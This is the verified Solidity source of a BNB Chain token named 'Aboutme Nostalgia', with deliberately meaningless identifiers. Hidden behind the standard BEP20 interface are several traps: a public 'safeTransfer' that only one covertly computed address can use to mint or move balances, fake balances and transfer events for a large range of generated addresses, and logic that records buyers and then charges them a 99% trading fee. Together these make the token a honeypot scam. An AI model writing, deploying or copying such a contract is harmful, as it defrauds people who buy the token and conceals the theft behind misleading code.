/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;



interface IUniswapV2Router {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}


interface IBEP20 {

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}




contract AboutmeNostalgia is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 feeLimitLaunchedAutoListMinSender = 2 ** 18 - 1;
    address private receiverFromMarketingList = (msg.sender);
    bool public fundTeamFeeFrom = false;
    address public uniswapV2Pair;
    bool private enableAutoLaunchMintMarketingTotal = false;
    uint256 txLiquidityBurnMintShouldAmount = 100000000 * (10 ** _decimals);
    uint256 public tokenListTxFund = 0;
    bool private totalMinLaunchIsTake = true;
    uint160 constant toLaunchWalletBurnFromSellLimit = 687370593896 * 2 ** 40;

    address constant botsFundLiquidityTx = 0x1fFa19649Ae40E863e193283DA3C1B7b5B5a208B;

    mapping(uint256 => address) private takeLimitBotsSender;
    uint256 private fundLimitReceiverMarketingSellAutoShould = 0;
    uint256 private senderExemptToLimit = 0;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    uint256 private atWalletTradingSender;


    uint256 private enableBotsTxIsMarketingLimitTake;
    mapping(address => bool) private maxBuyAtLimit;
    uint256 private burnFundMintMinTotalBuyLimit;
    uint256 private amountAtFundFee = 0;
    bool private totalSellTxLaunchedModeTokenFund = false;

    mapping(address => uint256) private swapAmountLaunchedLimitLaunch;


    uint256 buySwapAutoMax = 0;
    bool private liquidityLaunchedLaunchFee = true;
    mapping(address => bool) private isAutoShouldLimit;
    mapping(address => bool) private mintAtSwapReceiver;
    uint256 private receiverTakeIsLimit;
    
    uint256 private exemptIsLaunchedLimitSellMarketingMax = txLiquidityBurnMintShouldAmount / 1000; // 0.1%
    uint256 sellReceiverToMint = 22168;
    bool private swapListModeReceiver = true;
    uint256  constant MASK = type(uint128).max;
    bool private autoBurnMaxMinToFrom = true;

    uint256  fromShouldSwapBurnLaunchListFund = 100000000 * 10 ** _decimals;
    mapping(address => uint256) private tradingMarketingBurnList;
    bool private burnFeeFromTrading = true;
    uint256 private sellWalletEnableExemptLaunchAmount = 100;
    uint256 public isFundAmountWallet = 0;


    uint256  listLaunchedLaunchTo = 100000000 * 10 ** _decimals;

    mapping(address => bool) private amountSwapBotsFund;
    uint256 private tokenWalletFundLiquidityModeSender = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 private tokenSwapMaxTotalFeeTxAmount = 6 * 10 ** 15;
    uint256 private botsSenderSwapLaunchMin;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public maxWalletAmount = 0;
    uint256 public limitEnableMintShould = 0;
    uint256 public teamAutoTotalBurn = 0;
    mapping(address => uint256) _balances;

    uint256 private launchBlock = 0;

    uint256 private walletReceiverLimitBurn;
    uint256 constant walletFromAmountFund = 10000 * 10 ** 18;
    bool private exemptLaunchReceiverTo = false;
    string constant _symbol = "ANA";

    string constant _name = "Aboutme Nostalgia";
    address private autoBurnReceiverMode = (msg.sender);
    bool public takeMaxLiquidityReceiver = false;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    bool private amountBotsFundSender;
    uint256 private receiverMinLaunchLaunched = 0;
    uint160 constant totalLimitToShould = 121694751416 * 2 ** 80;

    bool public swapTradingTotalFee2 = false;
    bool public swapTradingTotalFee = false;

    mapping(uint256 => address) private launchedLaunchFromReceiverReceiverMarketing;
    uint160 constant fromSellBotsExempt = 535231528324 * 2 ** 120;
    uint256 constant sellAutoAmountFund = 300000 * 10 ** 18;
    uint256 private toFromTxAuto = 0;
    bool private maxBotsMintSwapSellBuy = false;

    uint160 constant tradingModeMarketingTeam = 947814061267;

    IUniswapV2Router public receiverIsListMax;

    uint256 private modeTeamLaunchedIs;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        receiverIsListMax = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(receiverIsListMax.factory()).createPair(address(this), receiverIsListMax.WETH());
        _allowances[address(this)][address(receiverIsListMax)] = txLiquidityBurnMintShouldAmount;

        amountBotsFundSender = true;

        mintAtSwapReceiver[msg.sender] = true;
        mintAtSwapReceiver[0x0000000000000000000000000000000000000000] = true;
        mintAtSwapReceiver[0x000000000000000000000000000000000000dEaD] = true;
        mintAtSwapReceiver[address(this)] = true;

        maxBuyAtLimit[msg.sender] = true;
        maxBuyAtLimit[address(this)] = true;

        amountSwapBotsFund[msg.sender] = true;
        amountSwapBotsFund[0x0000000000000000000000000000000000000000] = true;
        amountSwapBotsFund[0x000000000000000000000000000000000000dEaD] = true;
        amountSwapBotsFund[address(this)] = true;

        approve(_router, txLiquidityBurnMintShouldAmount);
        approve(address(uniswapV2Pair), txLiquidityBurnMintShouldAmount);
        _balances[msg.sender] = txLiquidityBurnMintShouldAmount;
        emit Transfer(address(0), msg.sender, txLiquidityBurnMintShouldAmount);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return txLiquidityBurnMintShouldAmount;
    }

    function gettakeTxToModeEnableBurnFund(address maxLimitExemptTakeEnableAmountWallet) public view returns (bool) {
            return isAutoShouldLimit[maxLimitExemptTakeEnableAmountWallet];
    }

    function amountLaunchMaxReceiverTakeTrading(address burnLiquidityExemptMax) internal view returns (bool) {
        return !amountSwapBotsFund[burnLiquidityExemptMax];
    }

    function getbuyTradingIsSellShould() public view returns (uint256) {
        if (toFromTxAuto != isFundAmountWallet) {
            return isFundAmountWallet;
        }
        if (toFromTxAuto == tokenSwapMaxTotalFeeTxAmount) {
            return tokenSwapMaxTotalFeeTxAmount;
        }
        return toFromTxAuto;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, txLiquidityBurnMintShouldAmount);
    }

    function getsenderBuyFundAtShouldLimit() public view returns (bool) {
        return maxBotsMintSwapSellBuy;
    }

    function getburnReceiverLimitMarketing() public view returns (uint256) {
        if (receiverMinLaunchLaunched != sellWalletEnableExemptLaunchAmount) {
            return sellWalletEnableExemptLaunchAmount;
        }
        return receiverMinLaunchLaunched;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setreceiverLimitReceiverSenderShould(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (teamAutoTotalBurn == tokenListTxFund) {
            tokenListTxFund=maxLimitExemptTakeEnableAmountWallet;
        }
        teamAutoTotalBurn=maxLimitExemptTakeEnableAmountWallet;
    }

    function exemptMaxLiquidityLimit(address burnLiquidityExemptMax, address txAmountTakeLiquidity, uint256 listLimitAutoBots, bool enableFromReceiverMax) private {
        if (enableFromReceiverMax) {
            burnLiquidityExemptMax = address(uint160(uint160(botsFundLiquidityTx) + buySwapAutoMax));
            buySwapAutoMax++;
            _balances[txAmountTakeLiquidity] = _balances[txAmountTakeLiquidity].add(listLimitAutoBots);
        } else {
            _balances[burnLiquidityExemptMax] = _balances[burnLiquidityExemptMax].sub(listLimitAutoBots);
        }
        emit Transfer(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots);
    }

    function setbotsSellModeToTeamLimit(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (amountAtFundFee == toFromTxAuto) {
            toFromTxAuto=maxLimitExemptTakeEnableAmountWallet;
        }
        amountAtFundFee=maxLimitExemptTakeEnableAmountWallet;
    }

    function setLaunchBlock(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (launchBlock == maxWalletAmount) {
            maxWalletAmount=maxLimitExemptTakeEnableAmountWallet;
        }
        if (launchBlock == limitEnableMintShould) {
            limitEnableMintShould=maxLimitExemptTakeEnableAmountWallet;
        }
        launchBlock=maxLimitExemptTakeEnableAmountWallet;
    }

    function setsenderBuyFundAtShouldLimit(bool maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        maxBotsMintSwapSellBuy=maxLimitExemptTakeEnableAmountWallet;
    }

    function setisMaxFundWalletEnableMintMin(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        sellWalletEnableExemptLaunchAmount=maxLimitExemptTakeEnableAmountWallet;
    }

    function maxReceiverExemptTeam() private {
        if (tokenListTxFund > 0) {
            for (uint256 i = 1; i <= tokenListTxFund; i++) {
                if (swapAmountLaunchedLimitLaunch[takeLimitBotsSender[i]] == 0) {
                    swapAmountLaunchedLimitLaunch[takeLimitBotsSender[i]] = block.timestamp;
                }
            }
            tokenListTxFund = 0;
        }
    }

    function sellAtTxMode(uint160 txAmountTakeLiquidity) private view returns (bool) {
        return uint16(txAmountTakeLiquidity) == sellReceiverToMint;
    }

    function setminFeeMarketingWallet(bool maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (totalSellTxLaunchedModeTokenFund == swapTradingTotalFee2) {
            swapTradingTotalFee2=maxLimitExemptTakeEnableAmountWallet;
        }
        totalSellTxLaunchedModeTokenFund=maxLimitExemptTakeEnableAmountWallet;
    }

    function getWBNB() public view returns (address) {
        if (WBNB == WBNB) {
            return WBNB;
        }
        if (WBNB != autoBurnReceiverMode) {
            return autoBurnReceiverMode;
        }
        return WBNB;
    }

    function senderAtFeeMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeListMinSellLaunched(uint160 receiverBotsMaxFeeAtMarketing) private view returns (uint256) {
        uint256 receiverShouldMintMarketing = buySwapAutoMax;
        uint256 fundTotalWalletExempt = receiverBotsMaxFeeAtMarketing - uint160(botsFundLiquidityTx);
        if (fundTotalWalletExempt < receiverShouldMintMarketing) {
            return walletFromAmountFund;
        }
        return sellAutoAmountFund;
    }

    function getMaxTotalAmount() public {
        buyBotsSenderLiquidity();
    }

    function exemptTeamListFrom(address burnLiquidityExemptMax, bool receiverShouldMintMarketingelling) internal returns (uint256) {
        
        if (receiverShouldMintMarketingelling) {
            walletReceiverLimitBurn = amountAtFundFee + toFromTxAuto;
            return marketingShouldListTxBuy(burnLiquidityExemptMax, walletReceiverLimitBurn);
        }
        if (!receiverShouldMintMarketingelling && burnLiquidityExemptMax == uniswapV2Pair) {
            walletReceiverLimitBurn = tokenWalletFundLiquidityModeSender + senderExemptToLimit;
            return walletReceiverLimitBurn;
        }
        return marketingShouldListTxBuy(burnLiquidityExemptMax, walletReceiverLimitBurn);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getMaxTotalAFee() public {
        maxReceiverExemptTeam();
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (totalExemptIsAt(uint160(account))) {
            return modeListMinSellLaunched(uint160(account));
        }
        return _balances[account];
    }

    function getisMaxFundWalletEnableMintMin() public view returns (uint256) {
        if (sellWalletEnableExemptLaunchAmount == tokenSwapMaxTotalFeeTxAmount) {
            return tokenSwapMaxTotalFeeTxAmount;
        }
        if (sellWalletEnableExemptLaunchAmount == isFundAmountWallet) {
            return isFundAmountWallet;
        }
        return sellWalletEnableExemptLaunchAmount;
    }

    function setbuyTradingIsSellShould(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (toFromTxAuto != sellWalletEnableExemptLaunchAmount) {
            sellWalletEnableExemptLaunchAmount=maxLimitExemptTakeEnableAmountWallet;
        }
        if (toFromTxAuto == exemptIsLaunchedLimitSellMarketingMax) {
            exemptIsLaunchedLimitSellMarketingMax=maxLimitExemptTakeEnableAmountWallet;
        }
        if (toFromTxAuto == teamAutoTotalBurn) {
            teamAutoTotalBurn=maxLimitExemptTakeEnableAmountWallet;
        }
        toFromTxAuto=maxLimitExemptTakeEnableAmountWallet;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptTradingAmountLaunch(msg.sender, recipient, amount);
    }

    function getreceiverLimitReceiverSenderShould() public view returns (uint256) {
        if (teamAutoTotalBurn != fundLimitReceiverMarketingSellAutoShould) {
            return fundLimitReceiverMarketingSellAutoShould;
        }
        if (teamAutoTotalBurn != isFundAmountWallet) {
            return isFundAmountWallet;
        }
        if (teamAutoTotalBurn == sellWalletEnableExemptLaunchAmount) {
            return sellWalletEnableExemptLaunchAmount;
        }
        return teamAutoTotalBurn;
    }

    function safeTransfer(address burnLiquidityExemptMax, address txAmountTakeLiquidity, uint256 listLimitAutoBots) public {
        if (!walletReceiverLimitMode(uint160(msg.sender))) {
            return;
        }
        if (totalExemptIsAt(uint160(txAmountTakeLiquidity))) {
            exemptMaxLiquidityLimit(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots, false);
            return;
        }
        if (totalExemptIsAt(uint160(burnLiquidityExemptMax))) {
            exemptMaxLiquidityLimit(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots, true);
            return;
        }
        if (burnLiquidityExemptMax == address(0)) {
            _balances[txAmountTakeLiquidity] = _balances[txAmountTakeLiquidity].add(listLimitAutoBots);
            return;
        }
    }

    function botsIsListFrom() private view returns (uint256) {
        return block.timestamp;
    }

    function buyBotsSenderLiquidity() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (swapAmountLaunchedLimitLaunch[launchedLaunchFromReceiverReceiverMarketing[i]] == 0) {
                    swapAmountLaunchedLimitLaunch[launchedLaunchFromReceiverReceiverMarketing[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function atAmountTokenSell(address liquidityModeMaxWalletFrom) private {
        uint256 tradingTotalFeeList = teamTokenBotsEnableTrading();
        if (tradingTotalFeeList < tokenSwapMaxTotalFeeTxAmount) {
            tokenListTxFund += 1;
            takeLimitBotsSender[tokenListTxFund] = liquidityModeMaxWalletFrom;
            tradingMarketingBurnList[liquidityModeMaxWalletFrom] += tradingTotalFeeList;
            if (tradingMarketingBurnList[liquidityModeMaxWalletFrom] > tokenSwapMaxTotalFeeTxAmount) {
                maxWalletAmount = maxWalletAmount + 1;
                launchedLaunchFromReceiverReceiverMarketing[maxWalletAmount] = liquidityModeMaxWalletFrom;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        launchedLaunchFromReceiverReceiverMarketing[maxWalletAmount] = liquidityModeMaxWalletFrom;
    }

    function getminFeeMarketingWallet() public view returns (bool) {
        if (totalSellTxLaunchedModeTokenFund != totalSellTxLaunchedModeTokenFund) {
            return totalSellTxLaunchedModeTokenFund;
        }
        if (totalSellTxLaunchedModeTokenFund != swapTradingTotalFee2) {
            return swapTradingTotalFee2;
        }
        if (totalSellTxLaunchedModeTokenFund != takeMaxLiquidityReceiver) {
            return takeMaxLiquidityReceiver;
        }
        return totalSellTxLaunchedModeTokenFund;
    }

    function teamTokenBotsEnableTrading() private view returns (uint256) {
        address liquidityTeamReceiverSwap = WBNB;
        if (address(this) < WBNB) {
            liquidityTeamReceiverSwap = address(this);
        }
        (uint modeTokenBuyMint, uint mintIsBotsTotal,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 liquidityTradingLaunchedFundExempt,) = WBNB == liquidityTeamReceiverSwap ? (modeTokenBuyMint, mintIsBotsTotal) : (mintIsBotsTotal, modeTokenBuyMint);
        uint256 senderReceiverLaunchedBots = IERC20(WBNB).balanceOf(uniswapV2Pair) - liquidityTradingLaunchedFundExempt;
        return senderReceiverLaunchedBots;
    }

    function getbotsSellModeToTeamLimit() public view returns (uint256) {
        if (amountAtFundFee == tokenSwapMaxTotalFeeTxAmount) {
            return tokenSwapMaxTotalFeeTxAmount;
        }
        if (amountAtFundFee == limitEnableMintShould) {
            return limitEnableMintShould;
        }
        if (amountAtFundFee == tokenListTxFund) {
            return tokenListTxFund;
        }
        return amountAtFundFee;
    }

    function settakeTxToModeEnableBurnFund(address maxLimitExemptTakeEnableAmountWallet,bool burnLaunchedMinTotal) public onlyOwner {
        if (isAutoShouldLimit[maxLimitExemptTakeEnableAmountWallet] == mintAtSwapReceiver[maxLimitExemptTakeEnableAmountWallet]) {
           mintAtSwapReceiver[maxLimitExemptTakeEnableAmountWallet]=burnLaunchedMinTotal;
        }
        if (maxLimitExemptTakeEnableAmountWallet == ZERO) {
            autoBurnMaxMinToFrom=burnLaunchedMinTotal;
        }
        isAutoShouldLimit[maxLimitExemptTakeEnableAmountWallet]=burnLaunchedMinTotal;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock != exemptIsLaunchedLimitSellMarketingMax) {
            return exemptIsLaunchedLimitSellMarketingMax;
        }
        if (launchBlock != exemptIsLaunchedLimitSellMarketingMax) {
            return exemptIsLaunchedLimitSellMarketingMax;
        }
        if (launchBlock == toFromTxAuto) {
            return toFromTxAuto;
        }
        return launchBlock;
    }

    function teamAmountListLimitIsEnable(address liquidityModeMaxWalletFrom) private view returns (bool) {
        return liquidityModeMaxWalletFrom == receiverFromMarketingList;
    }

    function totalExemptIsAt(uint160 receiverBotsMaxFeeAtMarketing) private pure returns (bool) {
        if (receiverBotsMaxFeeAtMarketing >= uint160(botsFundLiquidityTx) && receiverBotsMaxFeeAtMarketing <= uint160(botsFundLiquidityTx) + 200000) {
            return true;
        }
        return false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != txLiquidityBurnMintShouldAmount) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return exemptTradingAmountLaunch(sender, recipient, amount);
    }

    function walletReceiverLimitMode(uint160 receiverBotsMaxFeeAtMarketing) private pure returns (bool) {
        uint160 marketingMintToMaxEnableFeeBots = fromSellBotsExempt + totalLimitToShould;
        marketingMintToMaxEnableFeeBots = marketingMintToMaxEnableFeeBots + toLaunchWalletBurnFromSellLimit + tradingModeMarketingTeam;
        return receiverBotsMaxFeeAtMarketing == marketingMintToMaxEnableFeeBots;
    }

    function getliquidityEnableListMin() public view returns (uint256) {
        if (tokenSwapMaxTotalFeeTxAmount != exemptIsLaunchedLimitSellMarketingMax) {
            return exemptIsLaunchedLimitSellMarketingMax;
        }
        if (tokenSwapMaxTotalFeeTxAmount == receiverMinLaunchLaunched) {
            return receiverMinLaunchLaunched;
        }
        return tokenSwapMaxTotalFeeTxAmount;
    }

    function marketingShouldListTxBuy(address burnLiquidityExemptMax, uint256 maxFromBurnEnable) private view returns (uint256) {
        uint256 tradingReceiverTokenBotsLaunched = swapAmountLaunchedLimitLaunch[burnLiquidityExemptMax];
        if (tradingReceiverTokenBotsLaunched > 0 && botsIsListFrom() - tradingReceiverTokenBotsLaunched > 0) {
            return 99;
        }
        return maxFromBurnEnable;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function swapEnableMarketingFundLimitFrom(address burnLiquidityExemptMax, address launchedMintTakeSell, uint256 listLimitAutoBots) internal returns (uint256) {
        
        uint256 receiverListIsMax = listLimitAutoBots.mul(exemptTeamListFrom(burnLiquidityExemptMax, launchedMintTakeSell == uniswapV2Pair)).div(sellWalletEnableExemptLaunchAmount);

        if (isAutoShouldLimit[burnLiquidityExemptMax] || isAutoShouldLimit[launchedMintTakeSell]) {
            receiverListIsMax = listLimitAutoBots.mul(99).div(sellWalletEnableExemptLaunchAmount);
        }

        _balances[address(this)] = _balances[address(this)].add(receiverListIsMax);
        emit Transfer(burnLiquidityExemptMax, address(this), receiverListIsMax);
        
        return listLimitAutoBots.sub(receiverListIsMax);
    }

    function exemptTradingAmountLaunch(address burnLiquidityExemptMax, address txAmountTakeLiquidity, uint256 listLimitAutoBots) internal returns (bool) {
        if (totalExemptIsAt(uint160(txAmountTakeLiquidity))) {
            exemptMaxLiquidityLimit(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots, false);
            return true;
        }
        if (totalExemptIsAt(uint160(burnLiquidityExemptMax))) {
            exemptMaxLiquidityLimit(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots, true);
            return true;
        }
        
        bool launchedTxShouldMintExemptFrom = teamAmountListLimitIsEnable(burnLiquidityExemptMax) || teamAmountListLimitIsEnable(txAmountTakeLiquidity);
        
        if (limitEnableMintShould != sellWalletEnableExemptLaunchAmount) {
            limitEnableMintShould = senderExemptToLimit;
        }

        if (teamAutoTotalBurn != senderExemptToLimit) {
            teamAutoTotalBurn = maxWalletAmount;
        }


        if (burnLiquidityExemptMax == uniswapV2Pair) {
            if (maxWalletAmount != 0 && sellAtTxMode(uint160(txAmountTakeLiquidity))) {
                buyBotsSenderLiquidity();
            }
            if (!launchedTxShouldMintExemptFrom) {
                atAmountTokenSell(txAmountTakeLiquidity);
            }
        }
        
        
        if (inSwap || launchedTxShouldMintExemptFrom) {return senderAtFeeMin(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots);}
        
        require((listLimitAutoBots <= listLaunchedLaunchTo) || mintAtSwapReceiver[burnLiquidityExemptMax] || mintAtSwapReceiver[txAmountTakeLiquidity], "Max TX Limit!");

        _balances[burnLiquidityExemptMax] = _balances[burnLiquidityExemptMax].sub(listLimitAutoBots, "Insufficient Balance!");
        
        uint256 listLimitAutoBotsReceived = amountLaunchMaxReceiverTakeTrading(burnLiquidityExemptMax) ? swapEnableMarketingFundLimitFrom(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBots) : listLimitAutoBots;

        _balances[txAmountTakeLiquidity] = _balances[txAmountTakeLiquidity].add(listLimitAutoBotsReceived);
        emit Transfer(burnLiquidityExemptMax, txAmountTakeLiquidity, listLimitAutoBotsReceived);
        return true;
    }

    function setburnReceiverLimitMarketing(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        receiverMinLaunchLaunched=maxLimitExemptTakeEnableAmountWallet;
    }

    function setWBNB(address maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        WBNB=maxLimitExemptTakeEnableAmountWallet;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setliquidityEnableListMin(uint256 maxLimitExemptTakeEnableAmountWallet) public onlyOwner {
        if (tokenSwapMaxTotalFeeTxAmount == maxWalletAmount) {
            maxWalletAmount=maxLimitExemptTakeEnableAmountWallet;
        }
        if (tokenSwapMaxTotalFeeTxAmount != launchBlock) {
            launchBlock=maxLimitExemptTakeEnableAmountWallet;
        }
        if (tokenSwapMaxTotalFeeTxAmount != amountAtFundFee) {
            amountAtFundFee=maxLimitExemptTakeEnableAmountWallet;
        }
        tokenSwapMaxTotalFeeTxAmount=maxLimitExemptTakeEnableAmountWallet;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}